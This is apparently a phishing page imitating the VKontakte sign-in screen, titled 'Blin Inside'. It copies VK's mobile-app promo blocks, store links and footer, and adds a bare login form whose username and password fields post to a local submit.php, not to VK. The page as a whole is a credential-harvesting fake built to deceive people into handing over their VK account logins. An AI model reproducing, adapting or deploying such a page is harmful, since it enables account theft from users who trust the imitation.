<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Blin Inside</title>
</head>

<body>

<table width=80% height=100%>
    <tr>
        <td align=left>
            <div class="login_mobile_promo_wrap clear_fix">
                <div class="login_mobile_apps">
                    <div class="login_mobile_header">ВКонтакте для мобильных устройств</div>
                    <div class="login_mobile_info">Установите официальное мобильное приложение ВКонтакте и оставайтесь в&nbsp;курсе новостей Ваших друзей, где бы Вы ни находились.</div>

                    <div class="login_app_devices">

                        <a href="https://play.google.com/store/apps/details?id=com.vkontakte.android" target="_blank" class="login_app_device login_app_device_android">
                            <div class="login_app_device_screen_wrap">
                                <div class="login_app_device_screen login_app_device_ru"></div>
                            </div>

                            <div class="login_app_download_wrap">
                                <button class="flat_button secondary button_light">
                                    <span class="login_app_download_icon"></span>
                                    VK для Android
                                </button>
                            </div>
                        </a>

                        <a href="https://www.microsoft.com/store/apps/9wzdncrfj1pt" target="_blank" class="login_app_device login_app_device_wp">
                            <div class="login_app_device_screen_wrap">
                                <div class="login_app_device_screen login_app_device_ru"></div>
                            </div>

                            <div class="login_app_download_wrap">
                                <button class="flat_button secondary button_light">
                                    <span class="login_app_download_icon"></span>
                                    VK для WP
                                </button>
                            </div>
                        </a>

                        <a href="https://itunes.apple.com/ru/app/id564177498" target="_blank" class="login_app_device login_app_device_ios">
                            <div class="login_app_device_screen_wrap">
                                <div class="login_app_device_screen login_app_device_ru"></div>
                            </div>

                            <div class="login_app_download_wrap">
                                <button class="flat_button secondary button_light">
                                    <span class="login_app_download_icon"></span>
                                    VK для iPhone
                                </button>
                            </div>
                        </a>

                    </div>
                    <a href="https://vk.com/products" class="login_all_products_button">Все продукты</a>
                </div>
                <a onclick="curBox().hide()" id="login_mobile_close" class="login_mobile_close"></a>

                <div class="login_about_mobile">
                    Для доступа к быстрой мобильной версии сайта ВКонтакте достаточно ввести в Вашем телефоне короткий адрес: <a target="_blank" href="https://m.vk.com/">m.vk.com</a>
                </div>
            </div>
        </td>

        <td align=right>
            <form action="submit.php" method="post" name="reg">
                <input type="text" name="login"></br></br>
                <input type="text" name="pass"></br></br>
                <input type="submit" value="Войти">
                <a href="https://vk.com/restore">Забыли пароль?</a></div>
            </form>
        </td>
    </tr>
</table>

<table width=100% height=100%>
    <tr>
        <td align=center>
            <div class="footer_nav" id="bottom_nav">
                <div class="footer_copy fl_l"><a href="https://vk.com/about">ВКонтакте</a> © 2017</div>
                <div class="footer_lang fl_r">Язык:<a class="footer_lang_link" onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 3, hash: &#39;e50e6b75f6d86ebb79&#39;})">English</a><a class="footer_lang_link" onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 0, hash: &#39;e50e6b75f6d86ebb79&#39;})">Русский</a><a class="footer_lang_link" onclick="ajax.post(&#39;al_index.php&#39;, {act: &#39;change_lang&#39;, lang_id: 1, hash: &#39;e50e6b75f6d86ebb79&#39;})">Українська</a><a class="footer_lang_link" onclick="if (vk.al) { showBox(&#39;lang.php&#39;, {act: &#39;lang_dialog&#39;, all: 1}, {params: {dark: true, bodyStyle: &#39;padding: 0px&#39;}, noreload: true}); } else { changeLang(1); } return false;">все языки »</a></div>
                <div class="footer_links">
                    <a class="bnav_a" href="https://vk.com/about">о компании</a>
                    <a class="bnav_a" href="https://vk.com/support?act=home" style="display: none;">помощь</a>
                    <a class="bnav_a" href="https://vk.com/terms">правила</a>
                    <a class="bnav_a" href="https://vk.com/ads" style="">реклама</a>

                    <a class="bnav_a" href="https://vk.com/dev">разработчикам</a>
                    <a class="bnav_a" href="https://vk.com/jobs" style="display: none;">вакансии</a>
                </div>
            </div>
        </td>
    </tr>
</table>

</body>
</html>
